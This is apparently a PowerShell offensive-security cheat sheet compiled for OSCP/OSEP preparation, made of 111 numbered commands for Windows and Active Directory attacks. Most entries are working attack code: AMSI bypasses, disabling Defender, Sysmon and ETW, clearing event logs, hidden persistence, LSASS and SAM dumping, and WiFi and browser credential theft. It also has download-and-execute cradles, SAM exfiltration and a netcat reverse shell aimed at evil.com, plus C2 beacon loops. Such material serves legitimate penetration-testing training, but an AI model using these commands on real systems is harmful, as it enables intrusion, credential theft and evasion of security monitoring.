## OS Recon

```powershell
# 1. Get basic system information
Get-ComputerInfo | Select-Object WindowsProductName, OsHardwareAbstractionLayer, WindowsVersion
# Provides OS version, build number, and hardware abstraction layer details

# 2. Get installed hotfixes/patches
Get-HotFix | Select-Object HotFixID, Description, InstalledOn
# Lists all Windows updates and patches - crucial for identifying missing security updates

# 3. Get running processes with detailed info
Get-Process | Select-Object Name, Id, Path, Company, StartTime | Where-Object { $_.Path }
# Shows processes with their full path, company name, and start time - helps identify suspicious processes

# 4. Get services with status and startup type
Get-Service | Select-Object Name, DisplayName, Status, StartType | Where-Object { $_.StartType -ne 'Disabled' }
# Identifies running services and their startup configuration - look for unusual services

# 5. Get scheduled tasks
Get-ScheduledTask | Select-Object TaskName, State, TaskPath | Where-Object { $_.State -eq 'Running' -or $_.State -eq 'Ready' }
# Lists scheduled tasks - common persistence mechanism for malware

# 6. Get installed applications
# FAST method via registry (preferred - Win32_Product is very slow and triggers MSI reconfiguration)
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
                 "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Select-Object DisplayName, DisplayVersion, Publisher | Where-Object { $_.DisplayName } | Sort-Object DisplayName
# Enumerates installed software from registry - fast and non-invasive

# 7. Get network adapters and IP configuration
Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv4DefaultGateway, DNSServer
# Shows network configuration including IPs, gateways, and DNS servers

# 8. Get listening ports and associated processes
Get-NetTCPConnection | Where-Object { $_.State -eq 'Listen' } | Select-Object LocalPort, LocalAddress, OwningProcess | ForEach-Object {
    $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
    $_ | Add-Member -NotePropertyName ProcessName -NotePropertyValue $proc.Name
    $_
} | Select-Object LocalPort, LocalAddress, ProcessName
# Identifies open ports and what processes are listening - critical for finding backdoors

# 9. Get firewall rules
Get-NetFirewallRule | Where-Object { $_.Enabled -eq 'True' } | Select-Object DisplayName, Direction, Action
# Lists enabled firewall rules - helps identify allowed inbound connections

# 10. Get logged-in users
Get-WmiObject -Class Win32_ComputerSystem | Select-Object UserName
Get-CimInstance -ClassName Win32_LoggedOnUser | Select-Object Antecedent, Dependent
# Shows currently logged-in users on the system

# 11. Get local users
Get-LocalUser | Select-Object Name, Enabled, PasswordLastSet, LastLogon
# Lists local user accounts with password and login information

# 12. Get local groups and members
Get-LocalGroup | ForEach-Object {
    $group = $_.Name
    Get-LocalGroupMember -Group $group | Select-Object @{N='Group';E={$group}}, Name
}
# Shows local group membership - helps identify privilege escalation paths

# 13. Get environment variables
Get-ChildItem Env: | Select-Object Name, Value | Sort-Object Name
# Shows system and user environment variables - can reveal sensitive paths or configurations

# 14. Get startup programs
Get-CimInstance -ClassName Win32_StartupCommand | Select-Object Command, User, Location
# Lists programs that run at startup - common persistence mechanism

# 15. Get system uptime
(Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime
# Shows when the system was last rebooted - helps determine if system has been restarted after compromise
```

## Active Directory Domain Enumeration

```powershell
# 16. Get current domain
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
# Returns the fully qualified domain name of the current domain

# 17. Get domain controllers
Get-ADDomainController -Filter * | Select-Object Name, Site, IPv4Address, OperatingSystem
# Lists all domain controllers with their IPs and OS versions - requires ActiveDirectory module

# 18. Get domain users
Get-ADUser -Filter * -Properties SamAccountName, Name, Enabled, PasswordLastSet, LastLogonDate, MemberOf | 
    Select-Object SamAccountName, Name, Enabled, PasswordLastSet, LastLogonDate, @{N='Groups';E={$_.MemberOf -join ', '}}
# Comprehensive user enumeration including group membership

# 19. Find privileged users
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, SamAccountName
Get-ADGroupMember -Identity "Enterprise Admins" | Select-Object Name, SamAccountName
# Lists members of high-privilege groups

# 20. Get domain computers
Get-ADComputer -Filter * -Properties Name, OperatingSystem, IPv4Address, LastLogonDate | 
    Select-Object Name, OperatingSystem, IPv4Address, LastLogonDate
# Enumerates all domain-joined computers with details

# 21. Get domain groups
Get-ADGroup -Filter * -Properties Name, GroupCategory, GroupScope, Members | 
    Select-Object Name, GroupCategory, GroupScope, @{N='MemberCount';E={($_.Members).Count}}
# Lists all domain groups with member counts

# 22. Find users with no password required
Get-ADUser -Filter {PasswordNotRequired -eq $true} -Properties PasswordNotRequired | 
    Select-Object SamAccountName, PasswordNotRequired
# Identifies accounts with no password requirement - security risk

# 23. Find users who never expire password
Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires | 
    Select-Object SamAccountName, PasswordNeverExpires
# Accounts with non-expiring passwords are potential security concerns

# 24. Get domain trusts
Get-ADTrust -Filter * | Select-Object Name, TrustType, TrustDirection, TrustAttributes
# Shows domain trust relationships - potential lateral movement paths

# 25. Get GPOs (Group Policy Objects)
Get-GPO -All | Select-Object DisplayName, CreationTime, ModificationTime, GpoStatus
# Lists all Group Policy Objects - can reveal security settings and configurations

# 26. Find computers with specific OS
Get-ADComputer -Filter {OperatingSystem -like "*Server*"} -Properties OperatingSystem | 
    Select-Object Name, OperatingSystem
# Identifies server systems - valuable targets for lateral movement

# 27. Find users with SPN (Service Principal Name) for Kerberoasting
Get-ADUser -Filter {ServicePrincipalName -ne $null} -Properties ServicePrincipalName, SamAccountName | 
    Select-Object SamAccountName, ServicePrincipalName
# SPNs can be used for Kerberoasting attacks to crack service account passwords

# 28. Get AD schema information
Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -LDAPFilter "(objectClass=classSchema)" | 
    Select-Object Name, objectClassCategory
# Reveals Active Directory schema structure

# 29. Find domain admins logged into workstations
# REQUIRES: PowerView loaded first - `. .\PowerView.ps1`
Get-ADComputer -Filter {OperatingSystem -notlike "*Server*"} -Properties Name | ForEach-Object {
    Get-NetSession -ComputerName $_.Name -ErrorAction SilentlyContinue | 
    Where-Object { $_.UserName -match "admin|Domain Admins" }
}
# Locates high-privilege accounts on non-server systems - great lateral movement target
# Native alternative (no PowerView needed):
Get-ADComputer -Filter {OperatingSystem -notlike "*Server*"} -Properties Name | ForEach-Object {
    $c = $_.Name
    query user /server:$c 2>$null | Select-Object @{N='Computer';E={$c}}, @{N='Session';E={$_}}
}

# 30. Get DNS records
Get-DnsServerResourceRecord -ComputerName (Get-ADDomainController).Name -ZoneName (Get-ADDomain).DNSRoot | 
    Select-Object HostName, RecordType, RecordData
# Enumerates DNS records - can reveal additional infrastructure
```

## Security & **Defense Evasion**

```powershell
# 31. Check AMSI (Antimalware Scan Interface) status
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Attempts to disable AMSI by setting initialization flag to failed (for educational purposes)

# 32. Check PowerShell logging status
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -ErrorAction SilentlyContinue
# Checks if script block logging is enabled - helps understand detection capabilities

# 33. Disable Windows Defender real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true
# Disables Windows Defender real-time protection (requires admin privileges)

# 34. Add Windows Defender exclusion
Add-MpPreference -ExclusionPath "C:\Users\Public\Temp"
# Adds folder to Windows Defender exclusions - prevents scanning of malicious files

# 35. Clear event logs
wevtutil cl "Windows PowerShell" ; wevtutil cl "Microsoft-Windows-PowerShell/Operational" ; wevtutil cl "Security"
# Clears PowerShell and Security event logs - covers tracks

# 36. Disable Windows Defender firewall for specific profile
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
# Disables Windows Firewall (highly noisy - use with caution)

# 37. Add firewall rule for backdoor
New-NetFirewallRule -DisplayName "System Update Service" -Direction Inbound -LocalPort 4444 -Protocol TCP -Action Allow
# Creates stealthy firewall rule for C2 communication

# 38. Bypass execution policy for current session
Set-ExecutionPolicy Bypass -Scope Process -Force
# Allows script execution without changing system policy

# 39. Obfuscate PowerShell command using variable concatenation
$c1 = 'IEx'
$c2 = ' (New-Ob'
$c3 = 'ject Net.WebClient).DownloadString("http://evil.com/payload.ps1")'
Invoke-Expression ($c1 + $c2 + $c3)
# Obfuscation technique to evade static detection

# 40. Check if running as admin
([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
# Determines current privilege level

# 41. Disable Sysmon
$sysmon = Get-WmiObject -Query "SELECT * FROM Win32_Service WHERE Name = 'Sysmon'"
$sysmon.StopService()
# Stops Sysmon logging (requires admin)

# 42. Remove Windows Defender signatures
Stop-Service WinDefend
Remove-Item -Path "C:\ProgramData\Microsoft\Windows Defender\Definition Updates\*" -Recurse -Force
# Attempts to remove signature updates (requires admin and will likely regenerate)

# 43. Modify hosts file for traffic redirection
"127.0.0.1 updates.microsoft.com" | Out-File -FilePath "C:\Windows\System32\drivers\etc\hosts" -Encoding ASCII -Append
# Redirects security updates to localhost

# 44. Disable Event Tracing for Windows (ETW)
$etw = [System.Diagnostics.Eventing.EventProvider]::new("{26c8da07-b4f4-56f2-876f-d6ad2a5ba30e}")
$etw.Dispose()
# Disables ETW telemetry - disrupts EDR telemetry

# 45. Hide PowerShell window
powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "YourCommand"
# Launches PowerShell without visible window
```

## File System & Persistence

```powershell
# 46. Create scheduled task for persistence
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"C:\Users\Public\payload.ps1`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "WindowsUpdateService"
# Creates persistent scheduled task that runs as SYSTEM at boot

# 47. Create registry persistence
New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityUpdate" -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityUpdate" -Value "C:\Users\Public\payload.exe"
# Adds startup entry to HKCU registry for current user

# 48. Create WMI Event Subscription for persistence
$filterArgs = @{Name='MyFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs
# Complex WMI persistence - fires every 60 seconds (system monitoring required)

# 49. Find writable directories
Get-ChildItem C:\ -Directory -Recurse -ErrorAction SilentlyContinue | Where-Object { (Get-Acl $_.FullName).Access | Where-Object { $_.IdentityReference -like "*Users*" -and $_.FileSystemRights -match "Write" } }
# Finds directories writable by non-privileged users

# 50. Download file from internet
Invoke-WebRequest -Uri "http://evil.com/malware.exe" -OutFile "C:\Users\Public\svchost.exe"
# Downloads file using native cmdlet

# 51. Upload file using base64 encoding
$file = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Windows\System32\config\SAM"))
Invoke-WebRequest -Uri "http://evil.com/upload" -Method POST -Body $file
# Exfiltrates SAM file via base64 encoding

# 52. Find sensitive files
Get-ChildItem -Path C:\Users -Include *.kdbx, *.key, *.pfx, *.p12, *.rdp, *.sql, *.xml -Recurse -ErrorAction SilentlyContinue
# Searches for sensitive file types (password databases, certificates, etc.)

# 53. Alternate Data Streams (ADS) creation
Set-Content -Path "C:\Windows\System32\calc.exe" -Stream "hidden" -Value "This is hidden data"
# Creates ADS on file (stealth data hiding)

# 54. Read alternate data stream
Get-Content -Path "C:\Windows\System32\calc.exe" -Stream "hidden"
# Reads data from hidden ADS

# 55. Find all alternate data streams
Get-ChildItem -Recurse | ForEach-Object { Get-Item -Path $_.FullName -Stream * } | Where-Object { $_.Stream -ne ':$DATA' }
# Enumerates all ADS on system - useful for detecting malware hiding techniques

# 56. Encrypt/Decrypt file with DPAPI
$secureString = ConvertTo-SecureString -String "SensitiveData" -AsPlainText -Force
$encrypted = ConvertFrom-SecureString -SecureString $secureString
# Uses Windows DPAPI for encryption (user-specific)

# 57. Create symbolic link to SAM file
New-Item -ItemType SymbolicLink -Path C:\Users\Public\SAM -Target C:\Windows\System32\config\SAM
# Creates symlink for easier access

# 58. List all scheduled tasks with triggers
Get-ScheduledTask | ForEach-Object { 
    $task = $_; 
    $task.Triggers | Select-Object @{N='TaskName';E={$task.TaskName}}, PSComputerName, CimClass, CimInstanceProperties 
}
# Detailed scheduled task enumeration

# 59. Find world-writable files
Get-ChildItem -Recurse -ErrorAction SilentlyContinue | Where-Object { (Get-Acl $_.FullName).Access | Where-Object { $_.IdentityReference -eq "Everyone" -and $_.FileSystemRights -match "Write" } }
# Identifies files writable by anyone

# 60. Create hidden directory
$null = New-Item -Path "C:\Users\Public\.cache" -ItemType Directory -Force
Set-ItemProperty -Path "C:\Users\Public\.cache" -Name "Attributes" -Value "Hidden"
# Creates hidden folder for payload staging
```

## Credential Access & Extraction

```powershell
# 61. Dump LSASS process memory
$lsass = Get-Process -Name lsass
$dumpFile = "C:\Windows\Temp\lsass.dmp"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id $dumpFile full
# Creates memory dump of LSASS for credential extraction (requires admin)

# 62. Extract credentials from Windows Vault
Get-WmiObject -Namespace root\vault -Class WindowsVault -ErrorAction SilentlyContinue | 
    Select-Object @{N='Resource';E={$_.Properties.Item("Resource")}}, 
                  @{N='Username';E={$_.Properties.Item("Username")}},
                  @{N='Password';E={$_.Properties.Item("Password")}}
# Attempts to retrieve saved credentials from Windows Vault

# 63. Get stored RDP credentials
cmdkey /list
# Lists saved credentials including RDP

# 64. Extract browser credentials (Chrome example)
$chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$temp = "$env:TEMP\chrome.db"
Copy-Item $chrome $temp
# Copies Chrome login database for offline extraction

# 65. Retrieve Wifi passwords
netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $profile = ($_ -split ":")[1].Trim()
    netsh wlan show profile name=$profile key=clear
}
# Dumps saved WiFi credentials (useful for lateral movement)

# 66. Get IIS application pool credentials
Get-WebConfigurationProperty -Filter "system.webServer/applicationPools/*/processModel" -Name userName,password
# Extracts credentials from IIS application pools

# 67. Decrypt PowerShell secure strings
$encrypted = "01000000d08c9ddf0115d1118c7a00c04fc297eb010000001a3d8e2b2c7d4e3a9e5c1f2a8b6d4e7c0000000002000000000003660000c0000000100000001f2e8a7c4d6e8a0b2c4d6e8a0b2c4d6e80000000004800000a000000010000000f2e8a7c4d6e8a0b2c4d6e8a0b2c4d6e8180000006b6d6e6f7079746578740000000030c3c5b6d9e8f1a2b3c4d5e6f708192a3b4c5d6e7f"
$secure = $encrypted | ConvertTo-SecureString
$cred = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure))
# Converts encrypted secure strings back to plaintext

# 68. Get credentials from Windows Task Scheduler
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $task.Principal | Select-Object @{N='TaskName';E={$task.TaskName}}, LogonType, UserId
}
# Finds scheduled tasks running with elevated privileges

# 69. Extract passwords from PowerShell history
Get-Content (Get-PSReadlineOption).HistorySavePath | Select-String -Pattern "password|passwd|cred|secret"
# Searches PowerShell command history for sensitive strings

# 70. Dump all environment variables (may contain secrets)
Get-ChildItem Env: | Export-Csv -Path "$env:TEMP\env_vars.csv"
# Exports environment variables that may contain API keys or credentials

# 71. Get credentials from unattend.xml files
Get-ChildItem -Path C:\ -Include unattend.xml, autounattend.xml, sysprep.inf -Recurse -ErrorAction SilentlyContinue | 
    ForEach-Object { Get-Content $_ | Select-String "AdministratorPassword|UserPassword" }
# Searches for provisioning files containing passwords

# 72. Extract credentials from registry
Get-ChildItem "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\*" | Get-ItemProperty | 
    Select-Object PSChildName, Username, Password
# Attempts to find stored credentials in registry

# 73. Get computer accounts with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation, Name
# Identifies computers with unconstrained delegation - high-value targets

# 74. Get Kerberos tickets
klist
# Lists cached Kerberos tickets - potential for ticket passing attacks

# 75. Extract password hashes from registry (offline)
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
# Saves registry hives for offline hash extraction with tools like secretsdump.py
```

## Network and Lateral Movement

```powershell
# 76. Scan local network for alive hosts
1..254 | ForEach-Object {
    $ip = "192.168.1.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
        Write-Host "$ip is alive"
    }
}
# Simple ICMP sweep to discover live hosts

# 77. Port scan with Test-NetConnection
$ports = @(22,80,443,445,3389,5985,5986)
$ports | ForEach-Object {
    Test-NetConnection -ComputerName "target" -Port $_ -InformationLevel Quiet
}
# TCP port scanning for common services

# 78. WMI lateral movement
Invoke-WmiMethod -ComputerName "TARGET-PC" -Class Win32_Process -Name Create -ArgumentList "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.com/beacon.ps1')"
# Executes command on remote system via WMI

# 79. PSExec style execution via PowerShell
$s = New-PSSession -ComputerName "TARGET-PC" -Credential (Get-Credential)
Invoke-Command -Session $s -ScriptBlock { Start-Process "C:\Windows\Temp\payload.exe" -WindowStyle Hidden }
# PowerShell remoting lateral movement

# 80. SMB lateral movement with Copy-Item
Copy-Item -Path ".\payload.exe" -Destination "\\TARGET-PC\C$\Windows\Temp\" -Force
# Copies file to remote system via SMB

# 81. RDP registry enable (if disabled)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
# Enables RDP remotely (requires admin)

# 82. Create reverse shell with netcat (if present)
Start-Process "nc.exe" -ArgumentList "-e cmd.exe evil.com 4444" -WindowStyle Hidden
# Spawns reverse shell using netcat

# 83. SMB share enumeration
Get-SmbShare -ComputerName "TARGET-PC" | Select-Object Name, Path, Description
# Lists SMB shares on remote system

# 84. Check admin shares accessibility
Test-Path "\\TARGET-PC\C$"
# Tests if admin share is accessible

# 85. Invoke-Command with stored credential
$cred = Import-Clixml -Path "C:\Users\Public\cred.xml"
Invoke-Command -ComputerName "TARGET-PC" -Credential $cred -ScriptBlock { whoami }
# Uses exported credential for remote execution

# 86. Set up port forwarding with netsh
netsh interface portproxy add v4tov4 listenport=80 listenaddress=0.0.0.0 connectport=4444 connectaddress=127.0.0.1
# Creates local port forward for pivoting

# 87. ARP table enumeration
arp -a
# Shows ARP cache - network discovery without scanning

# 88. NetBIOS name resolution
nbtstat -A 192.168.1.100
# Reveals computer name and logged-in users via NetBIOS

# 89. DNS lookup for domain computers
Resolve-DnsName -Name "TARGET-PC.domain.local" -Type A
# Performs DNS resolution

# 90. PowerShell remoting with constrained endpoints
$session = New-PSSession -ComputerName "TARGET-PC" -ConfigurationName "Microsoft.PowerShell"
# Connects to constrained PowerShell endpoint (different capabilities)
```

## Advanced Techniques and Frameworks

```powershell
# 91. Cobalt Strike beacon simulation
$url = "http://c2server/beacon"
while($true) {
    $response = Invoke-RestMethod -Uri $url -Method Post -Body @{ computer = $env:COMPUTERNAME; user = $env:USERNAME }
    if($response.command) {
        $result = Invoke-Expression $response.command
        Invoke-RestMethod -Uri $url -Method Post -Body @{ result = $result }
    }
    Start-Sleep -Seconds 60
}
# Simulates C2 beacon callback with command execution

# 92. Empire/PowerShell Empire compatibility
$script = @"
function Invoke-Mimikatz {
    # Empire Mimikatz implementation
    Write-Host "[*] Executing Mimikatz"
    iex (New-Object Net.WebClient).DownloadString('http://empire/mimikatz.ps1')
}
"@
# Stub for Empire framework compatibility

# 93. PowerView equivalent commands
# Get domain users
Get-NetUser | Select-Object samaccountname, pwdlastset, logoncount
# Get domain computers
Get-NetComputer | Select-Object name, operatingsystem
# Get domain admins
Get-NetGroupMember -GroupName "Domain Admins"
# PowerView functions for AD enumeration (requires PowerView import)

# 94. Invoke-BloodHound collector
Invoke-BloodHound -CollectionMethod All -JSONFolder C:\Users\Public\BloodHound -ZipFilename bloodhound.zip
# Collects AD data for BloodHound analysis

# 95. AMSI bypass using reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Classic AMSI bypass technique

# 96. PowerShell downgrade attack
powershell.exe -Version 2 -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"
# Uses older PowerShell version to bypass security features

# 97. PowerShell without PowerShell (NoPowerShell)
$code = @'
[DllImport("kernel32.dll")]
public static extern IntPtr LoadLibrary(string dllName);
'@
Add-Type -MemberDefinition $code -Name "Win32" -Namespace "Kernel32"
[Kernel32.Win32]::LoadLibrary("C:\Windows\System32\amsi.dll")
# C# code execution within PowerShell to manipulate native APIs

# 98. Run EXE in memory
$bytes = [System.IO.File]::ReadAllBytes("C:\Windows\System32\calc.exe")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, (, [string[]] ('', '')))
# Loads and executes .NET assembly in memory (fileless execution)

# 99. PowerShell remoting over SSH
New-PSSession -HostName "target.lab" -UserName "user" -KeyFilePath "C:\Users\Public\id_rsa"
# PowerShell remoting over SSH (PowerShell 6+)

# 100. Create custom C2 with WebClient
$server = "http://your-server.com"
$uri = "$server/register"
$computer = $env:COMPUTERNAME
$user = $env:USERNAME
$data = @{computer=$computer; user=$user}
Invoke-RestMethod -Uri $uri -Method Post -Body $data

while($true) {
    $task = Invoke-RestMethod -Uri "$server/task/$computer" -Method Get
    if($task) {
        $result = Invoke-Expression $task.command
        Invoke-RestMethod -Uri "$server/result" -Method Post -Body @{computer=$computer; result=$result}
    }
    Start-Sleep -Seconds 30
}
# Complete C2 framework simulation with registration and tasking
```

## **Required Modules & Tools**

```powershell
# ActiveDirectory module (RSAT - built into domain-joined machines or install via RSAT)
Import-Module ActiveDirectory
# If not available, install RSAT on Windows 10/11:
# Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0

# PowerView — NOT on PSGallery, must download and dot-source
# Download: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
. .\PowerView.ps1
# Or load from memory (AMSI bypass first):
# IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# SharpHound — run as executable or import as module
# Download: https://github.com/BloodHoundAD/SharpHound/releases
.\SharpHound.exe -c All
# Or PowerShell version:
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# LAPS PowerShell module (if LAPS is deployed on domain)
Import-Module AdmPwd.PS

# PSFramework (legitimate helper module - IS on PSGallery)
Install-Module -Name PSFramework -Force
Import-Module PSFramework

# GroupPolicy module (for Get-GPO)
Import-Module GroupPolicy
# Install if missing:
# Add-WindowsCapability -Online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0
```

## AppLocker & Constrained Language Mode (CLM)

```powershell
# 101. Check AppLocker policy (what's blocked/allowed)
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
# Shows effective AppLocker rules - understand what binaries/scripts are restricted

# 102. Check AppLocker policy from registry (no admin needed)
Get-ChildItem "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -ErrorAction SilentlyContinue
# Alternative AppLocker check via registry

# 103. Detect Constrained Language Mode
$ExecutionContext.SessionState.LanguageMode
# Returns: FullLanguage (unrestricted) or ConstrainedLanguage (restricted by AppLocker/WDAC)

# 104. CLM bypass — use PowerShell 2.0 (no CLM support)
powershell.exe -Version 2 -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
# PS v2 does not enforce CLM — requires .NET 2.0 installed on target

# 105. CLM bypass — use a COM object to run code outside PS process
$shell = New-Object -ComObject WScript.Shell
$shell.Run("powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\script.ps1", 0, $false)
# Spawns PS outside current constrained session

# 106. Check if AppLocker is enforcing or audit-only
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections |
    Select-Object RuleCollectionType, EnforcementMode
# EnforcementMode: NotConfigured (off), AuditOnly, Enabled (blocking)

# 107. Find AppLocker writeable bypass paths (writable + allowed to execute)
# Common allowed paths that are also user-writable:
$bypassPaths = @(
    "C:\Windows\Tasks",
    "C:\Windows\Temp",
    "C:\Windows\tracing",
    "C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys",
    "C:\Windows\System32\spool\drivers\color",
    "C:\Windows\System32\Tasks"
)
$bypassPaths | ForEach-Object {
    $acl = Get-Acl $_ -ErrorAction SilentlyContinue
    if ($acl) { [PSCustomObject]@{ Path = $_; Writable = $true } }
}
# These paths are often whitelisted in AppLocker but writable by standard users
```

## LAPS (Local Administrator Password Solution)

```powershell
# 108. Check if LAPS is installed on domain
Get-ADObject "CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,$(([ADSI]'LDAP://RootDSE').rootDomainNamingContext)" -ErrorAction SilentlyContinue
# If object exists, LAPS is deployed in the domain

# 109. Read LAPS password (requires delegated read rights or DA)
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
    Select-Object Name, 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime' |
    Where-Object { $_.'ms-Mcs-AdmPwd' }
# ms-Mcs-AdmPwd is null if you don't have read rights, or contains plaintext password if you do

# 110. Check which users/groups can read LAPS passwords
Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=VULN,DC=local"
# Requires LAPS PowerShell module: Import-Module AdmPwd.PS

# 111. LAPS via CrackMapExec (from Linux)
# nxc ldap 10.10.10.100 -u dritchie -p 'P@ssw0rd123' -M laps
# Dumps LAPS passwords for all computers you have read rights over
```

_Guide compiled from lab notes + OSCP/OSEP prep - for authorized security testing only._
_Researched and Developed by **Abbas d3hack Aghayev**. Refined by "Sonnet4.6"_